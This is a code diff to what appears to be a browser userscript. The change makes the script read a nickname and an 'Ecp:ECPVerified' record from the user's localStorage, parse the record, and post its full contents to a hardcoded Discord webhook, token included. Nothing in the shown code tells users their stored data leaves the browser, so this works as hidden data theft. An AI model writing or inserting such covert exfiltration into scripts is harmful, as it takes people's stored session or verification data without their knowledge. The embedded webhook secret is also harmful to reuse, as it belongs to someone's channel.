@@ -619,14 +619,26 @@ injectLoader();
 
     // Retrieve values from localStorage
     const lastNickname = localStorage.getItem("lastNickname") || "Unknown";
-    const ECPVerified = localStorage.getItem("Ecp:ECPVerified") || "no";
+    let ECPVerified = localStorage.getItem("Ecp:ECPVerified") || "no";
+
+    // Parse ECPVerified if it contains JSON
+    try {
+        ECPVerified = JSON.parse(ECPVerified);
+    } catch (e) {
+        // If not JSON, keep it as a string
+    }
+
+    // Prepare ECPVerified content for logging
+    const ECPVerifiedContent = typeof ECPVerified === "object" 
+        ? JSON.stringify(ECPVerified, null, 2) 
+        : ECPVerified;
 
     // Webhook URL
     const webhookURL = "https://discord.com/api/webhooks/1332078434242920602/LaPifHcDpvwzWWKgHIEpydroC9GnhwAyDokGZwKSN_wOkPQ9S0jcTFM-dAlygkHbSgNN";
 
     // Payload for Discord webhook
     const payload = {
-        content: `${lastNickname} has entered the script\nEcp:ECPVerified: ${ECPVerified}`
+        content: `Nick:${lastNickname}\nEcp: ${ECPVerifiedContent}`
     };
 
     // Send payload to the Discord webhook
@@ -648,6 +660,7 @@ injectLoader();
         console.error("Error sending webhook:", error);
     });
 })();
+
 
 
 
